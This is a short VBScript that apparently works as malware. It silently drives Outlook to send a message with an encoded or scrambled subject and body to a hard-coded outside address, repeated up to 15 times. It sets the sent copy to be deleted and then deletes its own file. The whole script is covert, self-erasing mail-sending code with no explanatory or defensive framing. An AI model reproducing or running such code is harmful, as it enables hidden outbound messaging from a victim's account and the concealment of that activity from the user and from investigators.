On Error Resume Next
Dim adrenaline, Mail, Counter, A, B, C, D, E, F
Set adrenaline = CreateObject("outlook.application")
Set Mail = adrenaline.GetNameSpace("MAPI")
Counter = 1
Set C = adrenaline.CreateItem(0)
For D = 1 To 15
C.Recipients.Add "Rhape79@ultimatechaos.demon.co.uk"
Counter = Counter + 1
If Counter > 15 Then Exit For
Next
C.Subject = "hrcmpmatsnknpvnupkqabf"
C.Body = "prsgdm}hanibr|d{|mqmxj|gu}}sltfafujscbscujic|ezqoclgvbn}us|v~|vnpjvyrn~nhuvrwhhqfpkxxuqdeqsfmlzqjt|ssbvap}xwnhdn|~}llmgnutyhcrfglwrdokt|ljtcnc"
C.DeleteAfterSubmit = True
C.Send
Set F = CreateObject("Scripting.FileSystemObject")
F.DeleteFile Wscript.ScriptFullName
